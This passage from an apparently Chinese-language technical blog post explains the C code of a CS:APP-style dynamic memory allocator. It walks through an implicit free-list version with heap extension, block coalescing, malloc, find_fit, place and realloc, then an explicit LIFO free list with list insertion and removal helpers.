epilogue header */</span></span><br><span class="line">    PUT(HDRP(bp), PACK(size, <span class="number">0</span>));         <span class="comment">/* Free block header */</span></span><br><span class="line">    PUT(FTRP(bp), PACK(size, <span class="number">0</span>));         <span class="comment">/* Free block footer */</span></span><br><span class="line">    PUT(HDRP(NEXT_BLKP(bp)), PACK(<span class="number">0</span>, <span class="number">1</span>)); <span class="comment">/* New epilogue header */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Coalesce if the previous block was free */</span></span><br><span class="line">    <span class="keyword">return</span> coalesce(bp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>extend_heap 函数会在两种不同的环境中被调用：1）当堆被初始化时；2）当 loc 不能找到一个合适的匹配块时。为了保持对齐，extend_heap 将请求大小向上舍入为最接近的 2 字（8 字节）的倍数，然后向内存系统请求额外的堆空间。</p>
<p>extend_heap 函数的剩余部分有点儿微妙。堆开始于一个双字对齐的边界，并且每次对 extend_heap 的调用都返回一个块，该块的大小是双字的整数倍。因此，对 mem_sbrk 的每次调用都返回一个双字对齐的内存片，紧跟在结尾块的头部后面。这个头部变成了新的空闲块的头部，并且这个片的最后一个字变成了新的结尾块的头部。最后，在很可能出现的前一个堆以一个空闲块结束的情况中，调用 coalesce 函数来合并两个空闲块，并返回指向合并后的块的块指针。</p>
<h3 id="free"><a href="#free" class="headerlink" title="free"></a>free</h3><p>通过调用 mm_free 函数来释放一个以前分配的块，这个函数释放所请求的块（bp），然后使用边界标记合并技术将之与邻接的空闲块合并起来。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mm_free</span><span class="params">(<span class="keyword">void</span> *bp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> size = GET_SIZE(HDRP(bp));</span><br><span class="line"></span><br><span class="line">    PUT(HDRP(bp), PACK(size, <span class="number">0</span>));</span><br><span class="line">    PUT(FTRP(bp), PACK(size, <span class="number">0</span>));</span><br><span class="line">    coalesce(bp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *<span class="title">coalesce</span><span class="params">(<span class="keyword">void</span> *bp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> prev_alloc = GET_ALLOC(FTRP(PREV_BLKP(bp)));</span><br><span class="line">    <span class="keyword">size_t</span> next_alloc = GET_ALLOC(HDRP(NEXT_BLKP(bp)));</span><br><span class="line">    <span class="keyword">size_t</span> size = GET_SIZE(HDRP(bp));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (prev_alloc &amp;&amp; next_alloc) &#123;            <span class="comment">/* Case 1 */</span></span><br><span class="line">        <span class="keyword">return</span> bp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (prev_alloc &amp;&amp; !next_alloc) &#123;      <span class="comment">/* Case 2 */</span></span><br><span class="line">        size += GET_SIZE(HDRP(NEXT_BLKP(bp)));</span><br><span class="line">        PUT(HDRP(bp), PACK(size, <span class="number">0</span>));</span><br><span class="line">        PUT(FTRP(bp), PACK(size, <span class="number">0</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!prev_alloc &amp;&amp; next_alloc) &#123;      <span class="comment">/* Case 3 */</span></span><br><span class="line">        size += GET_SIZE(HDRP(PREV_BLKP(bp)));</span><br><span class="line">        PUT(FTRP(bp), PACK(size, <span class="number">0</span>));</span><br><span class="line">        PUT(HDRP(PREV_BLKP(bp)), PACK(size, <span class="number">0</span>));</span><br><span class="line">        bp = PREV_BLKP(bp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> &#123;                                     <span class="comment">/* Case 4 */</span></span><br><span class="line">        size += GET_SIZE(HDRP(PREV_BLKP(bp))) +</span><br><span class="line">                GET_SIZE(FTRP(NEXT_BLKP(bp)));</span><br><span class="line">        PUT(HDRP(PREV_BLKP(bp)), PACK(size, <span class="number">0</span>));</span><br><span class="line">        PUT(FTRP(NEXT_BLKP(bp)), PACK(size, <span class="number">0</span>));</span><br><span class="line">        bp = PREV_BLKP(bp);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> bp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>情况 1：前面的和后面块都已分配。情况 2：前面块已分配，后面块空闲。<br>情况 3：前面块空闲，后面块已分配。情况 4：后面块和前面块都空闲。</p>
</blockquote>
<ul>
<li><p>case1 ，两个邻接的块都是已分配的，不可能合并。所以当前块的状态只是简单地从已分配变成空闲。</p>
</li>
<li><p>case2，当前块与后面的块合并。用当前块和后面块的大小的和来更新当前块的头部和后面块的脚部。</p>
</li>
<li><p>case3，前面的块和当前块合并。用两个块大小的和来更新前面块的头部和当前块的脚部。</p>
</li>
<li><p>case4，要合并所有的三个块形成一个单独的空闲块，用三个块大小的和来更新前面块的头部和后面块的脚部。在每种情况中，合并都是在常数时间内完成的。</p>
</li>
</ul>
<h3 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h3><p>一个应用通过调用 mm_malloc 函数来向内存请求大小为 size 字节的块。在检査完请求的真假之后，分配器必须调整请求块的大小，从而为头部和脚部留有空间，并满足双字对齐的要求。代码强制了最小块大小是 16 字节：8 字节用来满足对齐要求，而另外 8 个用来放头部和脚部。对于超过 8 字节的请求一般的规则是加上开销字节，然后向上舍入到最接近的 8 的整数倍。</p>
<p>一旦分配器调整了请求的大小，它就会搜索空闲链表，寻找一个合适的空闲块。如果有合适的，那么分配器就放置这个请求块，并可选地分割出多余的部分，然后返回新分配块的地址。如果分配器不能够发现一个匹配的块，那么就用一个新的空闲块来扩展堆，把请求块放置在这个新的空闲块里，可选地分割这个块，然后返回一个指针，指向这个新分配的块。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">mm_malloc</span><span class="params">(<span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> asize;      <span class="comment">/* Adjusted block size */</span></span><br><span class="line">    <span class="keyword">size_t</span> extendsize; <span class="comment">/* Amount to extend heap if no fit */</span></span><br><span class="line">    <span class="keyword">char</span> *bp;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Ignore spurious requests */</span></span><br><span class="line">    <span class="keyword">if</span> (size == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Adjust block size to include overhead and alignment reqs. */</span></span><br><span class="line">    <span class="keyword">if</span> (size &lt;= DSIZE)</span><br><span class="line">        asize = <span class="number">2</span> * DSIZE;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        asize = DSIZE * ((size + (DSIZE) + (DSIZE - <span class="number">1</span>)) / DSIZE);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Search the free list for a fit */</span></span><br><span class="line">    <span class="keyword">if</span> ((bp = find_fit(asize)) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        place(bp, asize);</span><br><span class="line">        <span class="keyword">return</span> bp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* No fit found. Get more memory and place the block */</span></span><br><span class="line">    extendsize = MAX(asize, CHUNKSIZE);</span><br><span class="line">    <span class="keyword">if</span> ((bp = extend_heap(extendsize / WSIZE)) == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    place(bp, asize);</span><br><span class="line">    <span class="keyword">return</span> bp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *<span class="title">find_fit</span><span class="params">(<span class="keyword">size_t</span> asize)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *bp;</span><br><span class="line">    <span class="keyword">for</span>(bp = heap_list; GET_SIZE(HDRP(bp))&gt;<span class="number">0</span>; bp = NEXT_BLKP(bp)) &#123;</span><br><span class="line">        <span class="keyword">if</span>(!GET_ALLOC(HDRP(bp)) &amp;&amp; (asize &lt;= GET_SIZE(HDRP(bp)))) &#123;</span><br><span class="line">            <span class="keyword">return</span> bp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">place</span><span class="params">(<span class="keyword">void</span> *bp, <span class="keyword">size_t</span> asize)</span></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> csize = GET_SIZE(HDRP(bp));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>((csize-asize)&gt;=(<span class="number">2</span>*DSIZE)) &#123;</span><br><span class="line">        PUT(HDRP(bp), PACK(asize,<span class="number">1</span>));</span><br><span class="line">        PUT(FTRP(bp), PACK(asize,<span class="number">1</span>));</span><br><span class="line">        bp = NEXT_BLKP(bp);</span><br><span class="line">        PUT(HDRP(bp), PACK(csize-asize, <span class="number">0</span>));</span><br><span class="line">        PUT(FTRP(bp), PACK(csize-asize, <span class="number">0</span>));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123; <span class="comment">//否则，形成内部碎片</span></span><br><span class="line">        PUT(HDRP(bp), PACK(csize, <span class="number">1</span>));</span><br><span class="line">        PUT(FTRP(bp), PACK(csize, <span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="realloc"><a href="#realloc" class="headerlink" title="realloc"></a>realloc</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">mm_realloc</span><span class="params">(<span class="keyword">void</span> *ptr, <span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> oldsize;</span><br><span class="line">    <span class="keyword">void</span> *newptr;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(size == <span class="number">0</span>) &#123;</span><br><span class="line">        mm_free(ptr);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(ptr == <span class="literal">NULL</span>) <span class="keyword">return</span> mm_malloc(size);</span><br><span class="line">    </span><br><span class="line">    newptr = mm_malloc(size);</span><br><span class="line">    <span class="comment">/* If realloc() fails the original block is left untouched  */</span></span><br><span class="line">    <span class="keyword">if</span>(!newptr) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="comment">/* Copy the old data. */</span></span><br><span class="line">    oldsize = GET_SIZE(HDRP(ptr));</span><br><span class="line">    <span class="keyword">if</span>(size &lt; oldsize) oldsize = size;</span><br><span class="line">    <span class="built_in">memcpy</span>(newptr, ptr, oldsize);</span><br><span class="line">    <span class="comment">/* Free the old block. */</span></span><br><span class="line">    mm_free(ptr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> newptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="显示空闲链表"><a href="#显示空闲链表" class="headerlink" title="显示空闲链表"></a>显示空闲链表</h2><p>隐式空闲链表看上去比较简单容易理解，但因为块分配与堆块的总数呈线性关系，所以对于通用的分配器，隐式空闲链表是不适合的（尽管对于堆块数量预先就知道是很小的特殊的分配器来说还是可以）一种更好的方法是将空闲块组织为某种形式的显式数据结构，例如双向空闲链表，在每个空闲块中，都包含一个 pred 前驱和 succ 后继指针。使用双向链表而不是隐式空闲链表，使首次适配的分配时间从块总数的线性时间减少到了空闲块数量的线性时间。不过，释放一个块的时间取决于我们所选择的空闲链表中块的排序策略。</p>
<p>一种方法是用<strong>后进先出</strong>（LIFO）的顺序维护链表，将新释放的块放置在链表的开始处。使用 LIFO 的顺序和首次适配的放置策略，分配器会最先检查最近使用过的块。在这种情况下，释放一个块可以在常数时间内完成。如果使用了边界标记，那么合并也可以在常数时间内完成。</p>
<p>另一种方法是按照地址顺序来维护链表，其中链表中每个块的地址都小于它后继的地址。在这种情况下，释放一个块需要线性时间的搜索来定位合适的前驱。平衡点在于，按照地址排序的首次适配比 LIFO 排序的首次适配有更高的内存利用率，接近最佳适配的利用率。</p>
<h3 id="init-1"><a href="#init-1" class="headerlink" title="init"></a>init</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">mm_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>( (heap_list = mem_sbrk(<span class="number">6</span> * WSIZE)) == <span class="number">-1</span>) 	<span class="comment">//创建初始堆</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    </span><br><span class="line">    PUT(heap_list, <span class="number">0</span>);</span><br><span class="line">    PUT(heap_list + (<span class="number">1</span> * WSIZE), <span class="number">0</span>); 				<span class="comment">//空闲链表prev</span></span><br><span class="line">    PUT(heap_list + (<span class="number">2</span> * WSIZE), <span class="number">0</span>); 				<span class="comment">//空闲链表next</span></span><br><span class="line">    PUT(heap_list + (<span class="number">3</span> * WSIZE), PACK(DSIZE, <span class="number">1</span>)); 	<span class="comment">//序言块头</span></span><br><span class="line">    PUT(heap_list + (<span class="number">4</span> * WSIZE), PACK(DSIZE, <span class="number">1</span>)); 	<span class="comment">//序言块尾</span></span><br><span class="line">    PUT(heap_list + (<span class="number">5</span> * WSIZE), PACK(<span class="number">0</span>, <span class="number">1</span>)); 		<span class="comment">//结尾块</span></span><br><span class="line"></span><br><span class="line">    empty_list = heap_list + (<span class="number">1</span> * WSIZE);</span><br><span class="line">    heap_list += (<span class="number">4</span> * WSIZE); 			<span class="comment">//移动到尾部，之后方便插入</span></span><br><span class="line">    <span class="keyword">if</span>(extend_heap(CHUNKSIZE / DSIZE) == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>创建初始堆的大小由原先的 4 <em> WSIZE 扩充成了 6 </em> WSIZE ，在开始处新增了前后两个指针。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PREV_NODE(bp) ((char *)(bp))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NEXT_NODE(bp) ((char * )(bp) + WSIZE)</span></span><br><span class="line"><span class="comment">//给块指针，计算头部和尾部</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HDRP(bp)    ((char *)(bp)-WSIZE) </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FTRP(bp)    ((char *)(bp)+GET_SIZE(HDRP(bp))-DSIZE)</span></span><br><span class="line"><span class="comment">//调到下一个块，和上一个块</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NEXT_BLKP(bp)   ((char *)(bp)+GET_SIZE(((char *)(bp)-WSIZE)))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PREV_BLKP(bp)   ((char *)(bp)-GET_SIZE(((char *)(bp)-DSIZE)))</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span>* <span class="title">extend_heap</span><span class="params">(<span class="keyword">size_t</span> words)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* bp; <span class="keyword">size_t</span> size;</span><br><span class="line"></span><br><span class="line">    size = (words % <span class="number">2</span>) ? (words + <span class="number">1</span>) * DSIZE : words * DSIZE;</span><br><span class="line">    <span class="keyword">if</span>( (bp = mem_sbrk(size)) == <span class="number">-1</span>) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    PUT(HDRP(bp), PACK(size, <span class="number">0</span>));</span><br><span class="line">    PUT(FTRP(bp), PACK(size, <span class="number">0</span>));</span><br><span class="line">    PUT(NEXT_NODE(bp), <span class="number">0</span>);</span><br><span class="line">    PUT(PREV_NODE(bp), <span class="number">0</span>);</span><br><span class="line">    PUT(HDRP(NEXT_BLKP(bp)), PACK(<span class="number">0</span>, <span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> coalesce(bp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>向内存系统请求words大小的堆空间，因为堆是向上连续申请的，新申请的在结尾块后面。这里把之前的结尾块当做新申请的头部，申请最后字节当做尾部，最后再尝试合并bp前的块。</p>
<h3 id="free-1"><a href="#free-1" class="headerlink" title="free"></a>free</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mm_free</span><span class="params">(<span class="keyword">void</span> *ptr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(ptr == <span class="number">0</span>) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> size = GET_SIZE(HDRP(ptr));</span><br><span class="line"></span><br><span class="line">    PUT(HDRP(ptr), PACK(size, <span class="number">0</span>));</span><br><span class="line">    PUT(FTRP(ptr), PACK(size, <span class="number">0</span>));</span><br><span class="line">    PUT(NEXT_NODE(ptr), <span class="number">0</span>);</span><br><span class="line">    PUT(PREV_NODE(ptr), <span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">    coalesce(ptr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span>* <span class="title">coalesce</span><span class="params">(<span class="keyword">void</span> *bp)</span></span>&#123;</span><br><span class="line">    <span class="comment">//获取前后分配状态</span></span><br><span class="line">    <span class="keyword">size_t</span> prev_alloc = GET_ALLOC(FTRP(PREV_BLKP(bp)));</span><br><span class="line">    <span class="keyword">size_t</span> next_alloc = GET_ALLOC(HDRP(NEXT_BLKP(bp)));</span><br><span class="line">    <span class="keyword">size_t</span> size = GET_SIZE(HDRP(bp));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(prev_alloc &amp;&amp; next_alloc) &#123; 			<span class="comment">//都分配</span></span><br><span class="line">        </span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(prev_alloc &amp;&amp; !next_alloc)&#123; 	<span class="comment">//合并后块</span></span><br><span class="line">        size += GET_SIZE(HDRP(NEXT_BLKP(bp)));</span><br><span class="line">        fix_linklist(NEXT_BLKP(bp));</span><br><span class="line">        PUT(HDRP(bp), PACK(size,<span class="number">0</span>));</span><br><span class="line">        PUT(FTRP(bp), PACK(size,<span class="number">0</span>));</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(!prev_alloc &amp;&amp; next_alloc)&#123; 	<span class="comment">//合并前块</span></span><br><span class="line">        size += GET_SIZE(HDRP(PREV_BLKP(bp)));</span><br><span class="line">        fix_linklist(PREV_BLKP(bp));</span><br><span class="line">        PUT(FTRP(bp),PACK(size,<span class="number">0</span>));</span><br><span class="line">        PUT(HDRP(PREV_BLKP(bp)),PACK(size,<span class="number">0</span>));</span><br><span class="line">        bp = PREV_BLKP(bp);</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123; 								<span class="comment">//前后中一起合并</span></span><br><span class="line">        size += GET_SIZE(FTRP(NEXT_BLKP(bp))) + GET_SIZE(HDRP(PREV_BLKP(bp)));</span><br><span class="line">        fix_linklist(PREV_BLKP(bp));</span><br><span class="line">        fix_linklist(NEXT_BLKP(bp));</span><br><span class="line">        PUT(FTRP(NEXT_BLKP(bp)),PACK(size,<span class="number">0</span>));</span><br><span class="line">        PUT(HDRP(PREV_BLKP(bp)),PACK(size,<span class="number">0</span>));</span><br><span class="line">        bp = PREV_BLKP(bp);</span><br><span class="line">    &#125;</span><br><span class="line">    insert_to_emptylist(bp);</span><br><span class="line">    DEBUG_OUT;</span><br><span class="line">    <span class="keyword">return</span> bp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//插入空闲链表 采用LIFO，插入empty_list的前面</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">insert_to_emptylist</span><span class="params">(<span class="keyword">char</span>* bp)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* bp_next = GET(empty_list);</span><br><span class="line">    <span class="keyword">if</span>(bp_next != <span class="literal">NULL</span>) 			<span class="comment">//不是头结点</span></span><br><span class="line">        PUT(PREV_NODE(bp_next), bp);</span><br><span class="line">    PUT(NEXT_NODE(bp), bp_next); 	<span class="comment">//连入链表</span></span><br><span class="line">    PUT(empty_list, bp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//删除bp节点</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">fix_linklist</span><span class="params">(<span class="keyword">char</span>* bp)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span>* prev = GET(PREV_NODE(bp));</span><br><span class="line">    <span class="keyword">char</span>* next = GET(NEXT_NODE(bp));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(prev == <span class="literal">NULL</span>) &#123; 	<span class="comment">//不用修复前驱</span></span><br><span class="line">        <span class="keyword">if</span>(next != <span class="literal">NULL</span>) PUT(PREV_NODE(next), <span class="literal">NULL</span>);</span><br><span class="line">        PUT(empty_list, next);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; 			<span class="comment">//跳过当前节点</span></span><br><span class="line">        <span class="keyword">if</span>(next != <span class="literal">NULL</span>) PUT(PREV_NODE(next), prev);</span><br><span class="line">        PUT(NEXT_NODE(prev), next); </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    PUT(PREV_NODE(bp), <span class="literal">NULL</span>);</span><br><span class="line">    PUT(NEXT_NODE(bp), <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="malloc-1"><a href="#malloc-1" class="headerlink" title="malloc"></a>malloc</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">mm_malloc</span><span class="params">(<span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> asize; 		<span class="comment">//调整块大小后的大小</span></span><br><span class="line">    <span class="keyword">size_t</span> extendsize; 	<span class="comment">//如果找不到，申请新堆的大小</span></span><br><span class="line">    <span class="keyword">char</span> *bp;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(size ==<span class="number">0</span>) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(size &lt;= DSIZE) &#123; <span 